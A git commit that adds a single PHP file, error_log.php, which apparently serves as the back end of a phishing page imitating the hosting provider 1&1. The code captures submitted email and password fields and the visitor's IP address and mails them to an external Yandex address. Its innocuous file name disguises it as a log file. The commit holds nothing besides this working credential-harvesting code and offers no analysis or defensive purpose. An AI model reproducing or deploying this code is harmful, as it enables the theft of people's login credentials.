be53b0f9cc94b71d6d3e63a92bb8a93f0541f56e
aattched23 <142946766+aattched23@users.noreply.github.com>
2023-08-23 00:06:38 +0100

    Add files via upload

---
+++ error_log.php
@@ -0,0 +1,22 @@
+<?php
+$ip = getenv("REMOTE_ADDR");	
+
+if(!empty($_POST)) {
+ $email= $_POST['email'];
+ $password = $_POST['password'];
+ 
+		$to = "jo3r0se@yandex.com";
+		
+		
+         $subject = "1AND1";
+		 
+		 $message =  "General L0gs            : ".$email."\r\n";
+         $message .= "Password           : ".$password."\r\n";
+		 $message .= "IP           : ".$ip."\r\n";
+		$header = "Content type: Justin well tools \r\n";
+         $header .= "MIME-Version: 1.0\r\n";
+         $header .= "Content-type: text/html\r\n";
+		 
+		 mail ($to,$subject,$message,$header);
+}
+?>
